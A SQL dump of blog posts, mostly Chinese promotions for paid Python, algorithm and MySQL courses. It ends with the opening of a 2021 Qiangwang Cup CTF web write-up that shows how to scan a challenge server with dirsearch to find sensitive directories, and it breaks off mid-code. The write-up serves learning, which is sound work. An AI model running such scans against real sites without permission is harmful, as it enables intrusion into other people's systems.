src=\"https://img-blog.csdnimg.cn/20210615134133591.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl8zOTAzMjAxOQ==,size_16,color_FFFFFF,t_70\" width=\"975\"></p> \n <p>教程传送门：<strong><a href=\"https://marketing.csdn.net/u/weixin_39032019/e/3791\">【硬核】一线Python程序员实战经验分享</a></strong></p> \n <p>&nbsp;</p> \n <h3 id=\"%E4%BA%94%E3%80%81%E6%95%B0%E6%8D%AE%E7%BB%93%E6%9E%84%E4%B8%8E%E7%AE%97%E6%B3%95\">四、数据结构与算法</h3> \n <p>没有系统地学习过<strong>数据结构和算法的程序员只能称作是coder</strong>，算法不仅可以提升你的逻辑思维，还是你晋升的法宝。这门教程采用了动画的形式把难懂的算法知识形象的讲解出来，并拆解了各大厂的高频算法面试题，我是强烈推荐给你这个教程哦~</p> \n <p><strong>【推荐您学习这门课程的原因</strong><strong>】</strong></p> \n <p>图解数据结构与算法：<strong>拒绝抽象枯燥的学习，本课程采用动画演示的形式，让您在动画中掌握算法的底层原理</strong>。</p> \n <p><strong>【你将收获】</strong></p> \n <ol>\n  <li>系统化讲解常见的数据结构与算法，对数组、队列和栈、链表、哈希表、树、图等有深刻的认识</li>\n  <li>数据结构+进阶算法+算法思想，采用动画的形式讲解数据结构与算法，让学习不再枯燥</li>\n  <li>能够手写Java常见集合的实现，二次封装自己的数据结构库</li>\n  <li>解析大厂面试中的数据结构与算法题目，掌握其核心知识点</li>\n </ol> \n <p><strong>【适用人群】</strong></p> \n <ol>\n  <li>工作中不能熟练应用数据结构与算法的人；</li>\n  <li>编程能力弱且不会分析源码的程序员；</li>\n  <li>数据结构与算法面试能力弱，且想进入 BAT 等国内一线大厂的人；</li>\n  <li>准备从事 AI 相关工作的程序员。</li>\n </ol> \n <p>1、<strong>采用动画演示的形式</strong></p> \n <p><img alt=\"\" src=\"https://img-blog.csdnimg.cn/img_convert/4064bdf2140b9e989c9c763e022c4cea.gif\"></p> \n <p>2、<strong>全面、系统化的课程设计</strong>：系统化讲解数据结构与算法，让你快速梳理整个算法知识体系，掌握算法的核心思想。</p> \n <p><img alt=\"\" height=\"805\" src=\"https://img-blog.csdnimg.cn/20210615134732952.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl8zOTAzMjAxOQ==,size_16,color_FFFFFF,t_70\" width=\"1000\"></p> \n <p>3、<strong>实战2020大厂算法面试题</strong>：解析大厂算法面试题，分析其中算法原理，并动手实操，让大家通关面试最后一道题。</p> \n <p><img alt=\"\" height=\"517\" src=\"https://img-blog.csdnimg.cn/20210615112214152.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl8zOTAzMjAxOQ==,size_16,color_FFFFFF,t_70\" width=\"1000\"></p> \n <p><span style=\"color:#f33b45;\"><strong>教程传送门</strong></span>：<strong><a href=\"https://marketing.csdn.net/u/weixin_39032019/e/3795\">图解数据结构与算法</a></strong></p> \n <p>&nbsp;</p> \n <h3 id=\"%E5%85%AD%E3%80%81%E8%AE%A1%E7%AE%97%E6%9C%BA%E5%9F%BA%E7%A1%80\">五、计算机基础</h3> \n <p>很多粉丝会遇到这样的问题：语法学得挺溜，校招要求写“银行家算法”的实现，却一点也写不出来。出现这个问题的原因是什么？是计算机基础没学好！</p> \n <p>强烈建议你如果计算机基础没学好的，可以通过这个教程快速复习一下。这里涵盖了<strong>三大计算机基础知识全解</strong>。</p> \n <p><strong>【你将收获】</strong></p> \n <ol>\n  <li>计算机专业的核心课程，科班出身的核心竞争力，非科班必须补足的基础</li>\n  <li>理论知识+案例解析，50+更贴近日常工作的案例，在编程的过程中理解原理</li>\n  <li>编程必备的灵魂，进阶架构设计/系统设计必会的底层基础</li>\n  <li>以最新版Python作为开发语言，解锁爆火的人工智能编程语言</li>\n </ol> \n <p><img alt=\"\" height=\"655\" src=\"https://img-blog.csdnimg.cn/20210615135153769.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl8zOTAzMjAxOQ==,size_16,color_FFFFFF,t_70\" width=\"1009\"></p> \n <p><img alt=\"\" height=\"446\" src=\"https://img-blog.csdnimg.cn/20210615121116407.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl8zOTAzMjAxOQ==,size_16,color_FFFFFF,t_70\" width=\"987\"></p> \n <p><span style=\"color:#f33b45;\"><strong>教程传送门</strong></span>：<strong><a href=\"https://marketing.csdn.net/u/weixin_39032019/e/3800\">编程必备基础 计算机组成原理+操作系统+计算机网络</a></strong></p> \n <p>&nbsp;</p> \n <h3>六、Python入门</h3> \n <p>这个教程从<strong>Python环境搭建</strong>讲起，属于最基础的部分，所以即使你没有一点编程经验也可以很快上手！这个教程中用10个热门案例强化语法，都是和我们的使用场景非常接近的，比如：模拟支付宝的能量产生过程、逐行显示蚂蚁庄园动态、模拟“ 跳一跳 ”小游戏加分块……</p> \n <p><strong>除了基础，做开发最重要的就是实战项目</strong>！这份教程里都给你准备好了，游戏开发、淘宝用户数据分析、Django开发商城项目，这几个都是比较大的项目，用在毕设中也是非常不错的。如果你还想研究爬虫或数据分析，也可以继续深入研究。</p> \n <p><img alt=\"\" height=\"583\" src=\"https://img-blog.csdnimg.cn/2021061511040246.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl8zOTAzMjAxOQ==,size_16,color_FFFFFF,t_70\" width=\"1000\"></p> \n <p>再来说说搭配的实体书，这本书可以说是Python入门必看书籍了，在豆瓣评分9.1分，毫不犹豫入手了！</p> \n <p><img alt=\"\" height=\"600\" src=\"https://img-blog.csdnimg.cn/20210615110431267.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl8zOTAzMjAxOQ==,size_16,color_FFFFFF,t_70\" width=\"600\"></p> \n <p><img alt=\"\" height=\"1200\" src=\"https://img-blog.csdnimg.cn/20210615133023801.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl8zOTAzMjAxOQ==,size_16,color_FFFFFF,t_70\" width=\"628\"></p> \n <p><span style=\"color:#f33b45;\"><strong>教程传送门</strong></span>：<strong><a href=\"https://marketing.csdn.net/u/weixin_39032019/e/3792\">零基础学Python</a></strong></p> \n <p>&nbsp;</p> \n <h3 id=\"%E4%B8%83%E3%80%81MySQL\">七、MySQL</h3> \n <p>学习编程，你可能会犹豫选择 C++ 还是 Python；入门数据科学，你可能会纠结于选择 Python 还是 R；但无论如何，<strong> MySQL 都是 IT 从业人员不可或缺的技能！</strong></p> \n <p>在这个教程中，你可以从配置MySQL入门学起，学会SQL中数据查询语言DQL、数据操纵语言DML、数据定义语言DDL、数据控制语言DCL，学会熟练对库表进行增删改查等必备技能。</p> \n <p><img alt=\"\" height=\"411\" src=\"https://img-blog.csdnimg.cn/20210615135706479.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl8zOTAzMjAxOQ==,size_16,color_FFFFFF,t_70\" width=\"1103\"></p> \n <p><img alt=\"\" height=\"408\" src=\"https://img-blog.csdnimg.cn/20210615135843748.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl8zOTAzMjAxOQ==,size_16,color_FFFFFF,t_70\" width=\"987\"></p> \n <p><img alt=\"\" height=\"516\" src=\"https://img-blog.csdnimg.cn/20210615111604811.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl8zOTAzMjAxOQ==,size_16,color_FFFFFF,t_70\" width=\"1000\"></p> \n <p><span style=\"color:#f33b45;\"><strong>教程传送门</strong></span>：<strong><a href=\"https://marketing.csdn.net/u/weixin_39032019/e/3805\">程序员的MySQL学习宝典</a></strong></p> \n <p>&nbsp;</p> \n <blockquote> \n  <p>【<strong>抽奖环节</strong>】</p> \n  <p><strong>抽奖规则</strong>：只要评论数过30，随机抽取一名幸运读者，现金红包奖励&nbsp;<strong>66.66&nbsp;</strong>元！！</p> \n  <p><strong>开奖方式</strong>：采用python random随机函数，随机从评论区，摇出页数、序号。</p> \n  <p><strong>开奖时间</strong>：从文章发布时间起，第三天下午评开奖，评论区公布中奖结果~</p> \n </blockquote> \n <p><span style=\"color:#86ca5e;\"><strong>求点赞、求评论、求收藏</strong></span></p> \n</div>', '2021-07-03', NULL, '默认分类', '', 1, 0, NULL, NULL, 0);
INSERT INTO `t_article` VALUES (83, '3天学完10套Python顶级教程，端午节技术人消失之谜', '<div id=\"content_views\" class=\"markdown_views prism-atom-one-dark\"> \n <svg xmlns=\"http://www.w3.org/2000/svg\" style=\"display: none;\"> \n  <path stroke-linecap=\"round\" d=\"M5,0 0,2.5 5,5z\" id=\"raphael-marker-block\" style=\"-webkit-tap-highlight-color: rgba(0, 0, 0, 0);\"></path> \n </svg> \n <blockquote> \n  <p>端午节，擦姐粉丝群<br> 群友A：擦姐，消失去干啥了？<br> 群友B：听说擦姐去刷脸要福利去了<br> 群友C：啥课？</p> \n </blockquote> \n <p>端午节，擦姐慷(<code>hou</code>)慨(<code>zhe</code>)激(<code>lian</code>)昂(<code>pi</code>)从 CSDN 运营姐姐手中，要来了一波大促课程。</p> \n <p>只拿优惠价格购买课程，肯定还不够，擦姐为你还准备了如下福利：</p> \n <p>一旦你购买本文中任意课程，联系擦姐，都能拥有《爬虫 100 例教程》课程的一折购买资格， <code>3.99元即可拥有100个爬虫案例</code>。</p> \n <p><mark>实实在在的买一赠一堆。</mark></p> \n <p>这批课程全部是高质量的学习教程，以下内容均来自于我（CA）的编程学习体验，一定要根据自己的自身情况进行选择，千万不要盲目囤课哦~</p> \n <blockquote> \n  <p>买课注意 ❤️❤️ 之间的连接哦~</p> \n </blockquote> \n <h2><a id=\"Python_19\"></a>Python入门、爬虫、数据分析高质量教程精选</h2> \n <h3><a id=\"Python_20\"></a>Python入门到实战</h3> \n <p>擦姐在这个教程中看到了所有Python基础、语法、实战内容，从Python入门到高级的所有内容都包含在内了，对新手是非常合适的。</p> \n <p>无论你之后想从事哪个方向，学这个教程都是OK的。</p> \n <p>教程中基本上都是代码实操，我跟着学了一遍，感觉难度不大，新手也能跟得上。现在正是618活动，只需要49元就可以得到这个教程，一节视频才1块钱，很划算！</p> \n <p><img src=\"https://img-blog.csdnimg.cn/20210618113406701.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L2hpaGVsbA==,size_16,color_FFFFFF,t_70#pic_center\" alt=\"在这里插入图片描述\" width=\"700\"></p> \n <p>这门教程不涵盖Python的任何应用方向，只讲最基础、最核心的内容，无论你之后准备从事什么方向开发，这门课里的内容都得学，包含了：内置对象和基本的运算、语句等等（ 不含具体的应用方向，这个需要单独去学）。</p> \n <p><img src=\"https://img-blog.csdnimg.cn/20210616142628633.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L2hpaGVsbA==,size_16,color_FFFFFF,t_70#pic_center\" alt=\"在这里插入图片描述\" width=\"500\"><br> 相关教程传送门：<a href=\"https://marketing.csdn.net/u/hihell/e/3780\">❤️❤️零基础掌握Python入门到实战❤️❤️</a></p> \n <h3><a id=\"Python__38\"></a>Python 爬虫</h3> \n <p>为什么学爬虫？</p> \n <p>学习这个教程，你只需要有非常基础的Python基础即可，或者说学完上一门教程就足够了，我看了教程目录，</p> \n <p>将按照 <strong>网络请求&gt;数据分析&gt;数据存储</strong> 这几个步骤讲解：</p> \n <p>同时还讲解了反爬的原理与解决方案，比如：<code>IP代理</code>、<code>多线程爬虫</code>、<code>Scrapy和分布式爬虫</code>、<code>图形验证码识别</code>、<code>动态网页爬虫</code>、<code>字体反爬知识</code>。</p> \n <p><img src=\"https://img-blog.csdnimg.cn/20210616142823955.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L2hpaGVsbA==,size_16,color_FFFFFF,t_70#pic_center\" alt=\"在这里插入图片描述\" width=\"700\"></p> \n <p>教程传送门：<a href=\"https://marketing.csdn.net/u/hihell/e/3782\">❤️❤️150 讲轻松搞定 Python 网络爬虫 ❤️❤️</a></p> \n <h3><a id=\"Python__51\"></a>Python 数据分析方向</h3> \n <p>数据分析应该是目前 Python 领域应用最为广泛的方向了！</p> \n <p>这个教程从 Python 基础、工具使用、数据采集、数据处理到算法、数据挖掘都包含了，这算是我见过为数不多的教程中讲解较详细的了。</p> \n <p>让我推荐它的最大的原因是，讲解了<strong>4 个</strong>领域的经典项目，</p> \n <p>每一个项目全都从商业目标到数据获取到数据预处理，建立模型、模型发布整个流程非常顺畅，让你可以以最快的速度形成自己的方法论。</p> \n <p><img src=\"https://img-blog.csdnimg.cn/20210618113527181.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L2hpaGVsbA==,size_16,color_FFFFFF,t_70#pic_center\" alt=\"在这里插入图片描述\" width=\"300\"></p> \n <p><img src=\"https://img-blog.csdnimg.cn/20210615111515289.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L2hpaGVsbA==,size_16,color_FFFFFF,t_70#pic_center\" alt=\"在这里插入图片描述\" width=\"500\"><br> <img src=\"https://img-blog.csdnimg.cn/20210615111521949.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L2hpaGVsbA==,size_16,color_FFFFFF,t_70#pic_center\" alt=\"在这里插入图片描述\" width=\"500\"><br> 教程传送门：<a href=\"https://marketing.csdn.net/u/hihell/e/3781\">❤️❤️Python 数据分析与挖掘 ❤️❤️</a></p> \n <h3><a id=\"Python_68\"></a>Python人工智能方向</h3> \n <p>本教程专为准备入门人工智能的小白打造，并结合初级AI工程师的能力模型以及学习路径设计的教程内容。</p> \n <p>在课程中，系统讲解了Python语法编程、人工智能核心数学理论、机器学习八大算法、深度学习与神经网络、计算机视觉，为你求职人工智能打下夯实的基础。</p> \n <p>通过 6 大教程，5 大阶段，355 节视频课的学习，带你系统掌握初级AI工程师的核心能力。</p> \n <p><img src=\"https://img-blog.csdnimg.cn/20210616142936332.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L2hpaGVsbA==,size_16,color_FFFFFF,t_70#pic_center\" alt=\"在这里插入图片描述\"><br> 教程传送门：<a href=\"https://marketing.csdn.net/u/hihell/e/3772\">❤️❤️Python人工智能 ❤️❤️</a></p> \n <h3><a id=\"_82\"></a>计算机视觉方向</h3> \n <p>数字图像处理是一门前沿交叉学科，OpenCV 是更为流行和广泛运用的机器视觉库。这个教程讲解非常细致，包含 OpenCV 函数的基本使用方法，图像运算、阈值分割、图像金字塔等内容。</p> \n <p>教程传送门：<a href=\"https://marketing.csdn.net/u/hihell/e/3783\">❤️❤️Python+OpenCV 计算机视觉 ❤️❤️</a></p> \n <h3><a id=\"Python__88\"></a>Python 自动化办公方向</h3> \n <p>我写《爬虫 100 例教程》的时候，每完成一个粉丝的需求，都会收到“学爬虫真方便”的感叹，同时也因此引领了一部分小伙伴开始学爬虫。还有一部分粉丝并不想学爬虫，但是面对永远处理不完的文档和报表，直呼头疼，急需要解放时间！</p> \n <p>好啦，给你们挖到宝了！</p> \n <p>这门教程可以说是不想学枯燥乏味知识的朋友们的福音了，全程漫画讲解，还是纯干货，号称只讲有用的，文件自动整理、报表文档自动化。哈哈，听完二两老师的讲解，真是觉得二两老师也是幽默搞笑的杰出代表哇！</p> \n <p><img src=\"https://img-blog.csdnimg.cn/20210615111635733.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L2hpaGVsbA==,size_16,color_FFFFFF,t_70#pic_center\" alt=\"在这里插入图片描述\" width=\"400\"></p> \n <p>教程传送门：<a href=\"https://marketing.csdn.net/u/hihell/e/3786\">❤️❤️ 零基础 Python 自动化办公(漫画版)❤️❤️</a></p> \n <h3><a id=\"Python__101\"></a>Python 面试篇</h3> \n <p>这个教程搜集了各大互联网公司的 Python 面试题以及类似的题目。包括 Python 语言本身的知识、Python SDK、Web、Python 爬虫以及算法等内容。所以的源代码都使用 Python3.x 编写。Python 相关知识包括基本语法、正则表达式、字符串、数据库、网络、Web 等。算法包括了一些出镜率高的内容、如与链表、树、数组相关的算法。</p> \n <p><img src=\"https://img-blog.csdnimg.cn/2021061511170867.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L2hpaGVsbA==,size_16,color_FFFFFF,t_70#pic_center\" alt=\"在这里插入图片描述\" width=\"400\"><br> 可谓是真全面试集！</p> \n <p>教程传送门：<a href=\"https://marketing.csdn.net/u/hihell/e/3790\">❤️❤️Python 面试 100 讲（基于 Python3.x）❤️❤️</a></p> \n <p>本教程结合作者十多年 Python 开发经验，涉及到的知识点都是在实际工作中遇到的，并且已经解决的各种问题。还有的技术问题是搜集了国内外程序员遇到的各种类型的技术问题，部分和这些程序员直接交流，了解他们的需求以及某些理解上的困难。</p> \n <p>通过总结这些技术问题，并给出多种可能的解答，将非常有助于 Python 程序员解决在实际工作中遇到的各种问题。</p> \n <p><img src=\"https://img-blog.csdnimg.cn/20210615111735909.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L2hpaGVsbA==,size_16,color_FFFFFF,t_70#pic_center\" alt=\"在这里插入图片描述\" width=\"400\"><br> 教程传送门：<a href=\"https://marketing.csdn.net/u/hihell/e/3791\">❤️❤️【硬核】一线 Python 程序员实战经验分享 ❤️❤️</a></p> \n <h3><a id=\"_117\"></a>最后再给大家推荐几个基础必备教程</h3> \n <p>算法和MySQL、计算机基础都是入门Python需要学的核心知识。</p> \n <p>像算法、MySQL是面试时经常会问到的，而且我们在用Python写项目时更离不开算法和MySQL，特别是做数据分析的话，MySQL必然是不可或缺了。</p> \n <h4><a id=\"_124\"></a>算法教程</h4> \n <p>这个教程我觉得非常有趣，用动画的形式把难懂的算法知识形象的讲解出来，并且拆解了10+大厂的高频算法面试题，不管你是打算面试还是提高自己的算法技能，都是比较合适的教程，擦姐也在618薅到了羊毛，一起学起来吧~</p> \n <p><img src=\"https://img-blog.csdnimg.cn/20210618113842361.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L2hpaGVsbA==,size_16,color_FFFFFF,t_70#pic_center\" alt=\"在这里插入图片描述\" width=\"500\"></p> \n <ul>\n  <li>教程传送门：<a href=\"https://marketing.csdn.net/u/hihell/e/3795\">❤️❤️ 图解数据结构与算法 ❤️❤️</a></li>\n </ul> \n <h4><a id=\"MySQL80_133\"></a>MySQL教程（满足80%的程序员实用）</h4> \n <p>这个是我从CSDN程序员学院中，找到的应该算是最适合大众程序员学习的MySQL教程了，包含了80%程序员日常开发中需要使用的MySQL技术。不多数了，扫码一看便知。</p> \n <p><img src=\"https://img-blog.csdnimg.cn/20210618113923513.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L2hpaGVsbA==,size_16,color_FFFFFF,t_70#pic_center\" alt=\"在这里插入图片描述\" width=\"300\"></p> \n <ul>\n  <li>教程传送门：<a href=\"https://marketing.csdn.net/u/hihell/e/3801\">❤️❤️MySQL 数据库从入门到实战课 ❤️❤️</a></li>\n </ul> \n <h3><a id=\"_140\"></a>抽奖时间</h3> \n <p>没有买课怎么办，点赞评论收藏吧</p> \n <p><mark>只要评论数过 120<br> 随机抽取一名幸运读者<br> 奖励 39.9 元爬虫 100 例专栏 1 折购买券一份，只需 3.99 元</mark>。</p> \n</div>', '2021-07-03', NULL, '默认分类', '', 1, 0, NULL, NULL, 0);
INSERT INTO `t_article` VALUES (84, '[网络安全提高篇] 一一〇.强网杯CTF的Web Write-Up(上) 寻宝、赌徒、EasyWeb、pop_master', '<div id=\"content_views\" class=\"markdown_views prism-atom-one-dark\"> \n <svg xmlns=\"http://www.w3.org/2000/svg\" style=\"display: none;\"> \n  <path stroke-linecap=\"round\" d=\"M5,0 0,2.5 5,5z\" id=\"raphael-marker-block\" style=\"-webkit-tap-highlight-color: rgba(0, 0, 0, 0);\"></path> \n </svg> \n <p>强网杯作为国内最好的CTF比赛之一，搞安全的博友和初学者都可以去尝试下。首先，让我们观摩下这些大神队伍，包括0x300R、eee、0ops、AAA、NeSE、Nu1L等，真的值得我们去学习。其次，非常感谢强网杯的主办方，这么好的比赛离不开许多师傅们的辛苦，我们应该感恩这么高质量比赛的幕后工作者。最后，作为一枚安全菜鸡，不，比菜鸡还菜，就让我简单复现下本次比赛的Web题目。不喜勿喷，欢迎指正~</p> \n <p><img src=\"https://img-blog.csdnimg.cn/20210615000740887.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L0Vhc3Rtb3VudA==,size_16,color_FFFFFF,t_70#pic_center\" alt=\"在这里插入图片描述\" width=\"600\" height=\"320\"></p> \n <p>由于这次强网杯正值端午节，自己回家陪小孩和女神了，不回去也做不出来o(╥﹏╥)o，因此仅仅大致阅览了下Web题目。但整体而言，比赛题目的水准仍然非常高，尤其是RE和PWN，包括Web，所以还是有很多知识点值得我们学习的。最后，非常感谢参考文献的大佬们，尤其是Nu1L战队（推荐VX关注他们），也感谢许多参加比赛的伙伴和博友们。如果您是一名安全初学者，不妨多参加比赛，每一次CTF比赛都能让我们学到很多东西，即使是赛后的WP，也能成长不少。同时有个遗憾，比赛完后题目不能打开复现，将就看吧。</p> \n <p><mark>作者在外读博求学，接下里的时间都会放到论文和实验上，因此CSDN已停更技术文章，但这篇文章还是总结出来，只望对初学者有帮助。此外，我为自己定了一个新目标，33岁之后（博士毕业），正式进军CTF和AI比赛圈，那时候会刷大量的CTF题及参加各种实战比赛，寓教于乐，也希望能带着我贵州的学生站在CTF的舞台上或冲榜天池，到了那时，希望我这位菜鸟大叔还能保持激情。哈哈，加油，且行且珍惜~</mark></p> \n <p><strong>比赛信息</strong></p> \n <ul>\n  <li>比赛全称：第五届强网杯全国网络安全挑战赛</li>\n  <li>比赛地址：<a href=\"https://ctf.ichunqiu.com/2021qwb\">https://ctf.ichunqiu.com/2021qwb</a></li>\n  <li>开始时间：2021-06-12 09:00:00</li>\n  <li>结束时间：2020-06-13 21:00:00</li>\n </ul> \n <p><img src=\"https://img-blog.csdnimg.cn/20210615002618775.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L0Vhc3Rtb3VudA==,size_16,color_FFFFFF,t_70#pic_center\" alt=\"在这里插入图片描述\" width=\"600\" height=\"320\"></p> \n <p><img src=\"https://img-blog.csdnimg.cn/20210615002726779.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L0Vhc3Rtb3VudA==,size_16,color_FFFFFF,t_70#pic_center\" alt=\"在这里插入图片描述\" width=\"600\" height=\"320\"></p> \n <p></p> \n <div class=\"toc\"> \n  <h3>文章目录</h3> \n  <ul>\n   <li><a href=\"#EasyWeb_32\">一.EasyWeb</a></li>\n   <li>\n    <ul>\n     <li><a href=\"#1_34\">1.题目描述</a></li>\n     <li><a href=\"#2_47\">2.解题思路</a></li>\n    </ul> </li>\n   <li><a href=\"#_134\">二.[强网先锋]寻宝</a></li>\n   <li>\n    <ul>\n     <li><a href=\"#1_135\">1.题目描述</a></li>\n     <li><a href=\"#2_153\">2.解题思路</a></li>\n    </ul> </li>\n   <li><a href=\"#_345\">三.[强网先锋]赌徒</a></li>\n   <li>\n    <ul>\n     <li><a href=\"#1_347\">1.题目描述</a></li>\n     <li><a href=\"#2_359\">2.解题思路</a></li>\n    </ul> </li>\n   <li><a href=\"#pop_master_506\">四.pop_master</a></li>\n   <li>\n    <ul>\n     <li><a href=\"#1_508\">1.题目描述</a></li>\n     <li><a href=\"#2_537\">2.解题思路</a></li>\n     <li><a href=\"#3_610\">3.官方解题</a></li>\n    </ul> </li>\n   <li><a href=\"#_617\">五.总结</a></li>\n  </ul> \n </div> \n <p></p> \n <blockquote> \n  <p>声明：本人坚决反对利用教学方法进行犯罪的行为，一切犯罪行为必将受到严惩，绿色网络需要我们共同维护，更推荐大家了解它们背后的原理，更好地进行防护。该安全系列原文github已开源，如果喜欢也可以支持作者，赚点奶粉钱，哈哈。</p> \n </blockquote> \n <hr> \n <p>个人而言，感觉自己能做出来的主要是这四道题目，因此先结合大佬们的WP复述。下面一些方法是从我这个菜鸟的角度介绍，各位大神见笑，可以帮忙批评和指正，哈哈~</p> \n <h1><a id=\"EasyWeb_32\"></a>一.EasyWeb</h1> \n <h2><a id=\"1_34\"></a>1.题目描述</h2> \n <p>题目描述如下：</p> \n <ul>\n  <li>共132支队伍攻克，最后分值67pt</li>\n </ul> \n <p><img src=\"https://img-blog.csdnimg.cn/20210615005821780.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L0Vhc3Rtb3VudA==,size_16,color_FFFFFF,t_70#pic_center\" alt=\"在这里插入图片描述\" width=\"400\" height=\"280\"></p> \n <p>该网站打开如下图所示：</p> \n <p><img src=\"https://img-blog.csdnimg.cn/20210615005825524.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L0Vhc3Rtb3VudA==,size_16,color_FFFFFF,t_70#pic_center\" alt=\"在这里插入图片描述\" width=\"600\" height=\"350\"></p> \n <h2><a id=\"2_47\"></a>2.解题思路</h2> \n <p>如果直接访问文件会提示错误。</p> \n <p><img src=\"https://img-blog.csdnimg.cn/20210615010042733.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L0Vhc3Rtb3VudA==,size_16,color_FFFFFF,t_70#pic_center\" alt=\"在这里插入图片描述\" width=\"600\" height=\"350\"></p> \n <p><strong>第一步，从github下载dirsearch工具（Python脚本），这是一个目录扫描工具，目的是扫描网站的敏感文件和目录从而找到突破口。</strong></p> \n <ul>\n  <li> <p><a href=\"https://github.com/maurosoria/dirsearch\">https://github.com/maurosoria/dirsearch</a></p> </li>\n  <li> <p><mark>大佬们用啥扫描软件呢？Kali dirb吗？</mark></p> </li>\n </ul> \n <p><img src=\"https://img-blog.csdnimg.cn/2021061501030056.png#pic_center\" alt=\"在这里插入图片描述\" width=\"500\" height=\"300\"></p> \n <p>通过dirsearch扫描目录，自己在目录输入栏输入CMD快速进入。我们发现了敏感文件目录 <code>files</code> 。</p> \n <ul>\n  <li>-u：指定网址</li>\n  <li>-e：指定网站语言</li>\n  <li>-w：指定字典</li>\n  <li>-r：递归目录（跑出目录后，继续跑目录下面的目录）</li>\n  <li>-random-agents：使用随机UA</li>\n </ul> \n <p><img src=\"https://img-blog.csdnimg.cn/20210615010134625.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L0Vhc3Rtb3VudA==,size_16,color_FFFFFF,t_70#pic_center\" alt=\"在这里插入图片描述\" width=\"500\" height=\"300\"></p> \n <p><strong>第二步，打开files目录发现每个文件对应的路径。</strong></p> \n <ul>\n  <li><mark>http://47.104.137.239/files/</mark></li>\n </ul> \n <pre><code class=\"prism language-php\"><span class=\"token punctuation\">[</span><span class=\"token punctuation\">{\n    <!-- --></span><span class=\"token string double-quoted-string\">\"id\"</span><span class=\"token punctuation\">:</span><span class=\"token number\">1</span><span class=\"token punctuation\">,</span><span class=\"token string double-quoted-string\">\"path\"</span><span class=\"token punctuation\">:</span><span class=\"token string double-quoted-string\">\"c09358adff2ebfff2ef9b4fbacc4ac0b\"</span><span class=\"token punctuation\">,</span><span class=\"token string double-quoted-string\">\"filename\"</span><span class=\"token punctuation\">:</span><span class=\"token string double-quoted-string\">\"hint.txt\"</span><span class=\"token punctuation\">,</span><span class=\"token string double-quoted-string\">\"date\"</span><span class=\"token punctuation\">:</span><span class=\"token string 